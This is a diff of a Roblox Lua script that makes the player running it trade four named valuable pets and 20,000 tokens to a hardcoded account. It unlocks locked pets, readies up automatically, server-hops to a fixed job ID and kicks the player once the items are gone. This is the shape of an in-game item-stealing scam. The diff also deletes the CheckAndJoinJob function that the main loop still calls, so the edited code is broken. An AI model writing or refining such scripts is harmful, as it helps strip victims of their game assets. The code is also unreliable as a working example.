@@ -1,6 +1,6 @@
 local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot", "Grand Ice Wizard"}
 local tokenAmount = 20000
-local jobIDToJoin = "735a94c0-0b9e-4ad2-826d-6a076615e9c0" -- Job ID to check against
+local jobIDToJoin = "0b2d7cc8-60d4-419b-a303-af25527088cd" -- Job ID to check against
 local targetPlayerName = "Keiyoz"  -- Configurable target player's name
 
 local Players = game:GetService("Players")
@@ -128,12 +128,14 @@ end
 
 function TradeWithTarget()
     while true do
+        -- Ensure there are pets to trade
         if not HasPetsToTrade() then
-            player:Kick("No more pets to trade")
+            print("No pets to trade. Skipping trade attempt...")
+            task.wait(5)  -- Delay for 5 seconds before retrying the trade
             return
         end
         
-        UnlockPets()
+        UnlockPets()  -- Unlock any locked pets
 
         local target = FindTargetPlayer()
         if not target then
@@ -141,6 +143,7 @@ function TradeWithTarget()
             return
         end
         
+        -- Wait for the trading UI to be enabled
         while not player.PlayerGui.Trading.Enabled do
             Network:FireServer("SendTrade", target)
             task.wait(1)
@@ -148,19 +151,32 @@ function TradeWithTarget()
         
         local petIDs = GetPetIDsByName()
         if #petIDs > 0 then
+            -- Add pets to the trade
             for _, petId in ipairs(petIDs) do
                 Network:InvokeServer("AddTradeItem", { "Pet", petId })
             end
             
+            -- Add tokens to the trade (after pets)
+            AddTokensToTrade()
+
+            -- Ready up for the first time
             Network:FireServer("ReadyUp", false, true)
             
+            -- Wait 10 seconds after tokens are added before readying up again
+            task.wait(10)  -- **Wait 10 seconds here**
+
+            -- Now ready up again after waiting
+            Network:FireServer("ReadyUp", false, true)
+
+            -- Wait for the pets to be removed from inventory (trade completion check)
             local tradeCompleted = WaitForPetsRemoved(petIDs)
             if tradeCompleted then
                 task.wait(30)
-                
+
                 local checkStart = tick()
                 while tick() - checkStart < 5 do
                     if not HasPetsToTrade() then
+                        print("Trade completed successfully!")
                         player:Kick("Trade complete")
                         return
                     end
@@ -173,8 +189,13 @@ function TradeWithTarget()
             else
                 return
             end
+        else
+            -- If no pets, retry after delay
+            print("No pets available. Waiting for 5 seconds before retrying.")
+            task.wait(5)  -- Delay for 5 seconds before retrying the trade attempt
         end
         
+        -- If there are pets, continue or break out of the loop
         if HasPetsToTrade() then
             task.wait(1)
         else
@@ -183,33 +204,7 @@ function TradeWithTarget()
     end
 end
 
--- New function to check the Job ID and server hop if needed
-function CheckAndJoinJob()
-    local startTime = tick()
-    local currentJobID = game.JobId
-    
-    -- Check job ID for the first 5 seconds
-    while tick() - startTime < 5 do
-        if currentJobID == jobIDToJoin then
-            return true -- Stay in current server if it matches
-        end
-        task.wait(1)
-        currentJobID = game.JobId -- Re-check every second
-    end
-    
-    -- Server-hop logic if job ID does not match
-    local success, err = pcall(function()
-        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, jobIDToJoin)
-    end)
-    
-    if not success then
-        warn("Failed to join the desired server: " .. err)
-        return false
-    end
-    
-    return true
-end
-
+-- Main loop
 while true do
     if not HasPetsToTrade() then
         player:Kick("No more pets to trade")
@@ -218,7 +213,9 @@ while true do
     
     -- Check job ID and server hop if necessary
     if CheckAndJoinJob() then
+        -- Start with trading pets
         TradeWithTarget()
+        -- Then add tokens to the trade
         AddTokensToTrade()
     end
     task.wait(1)
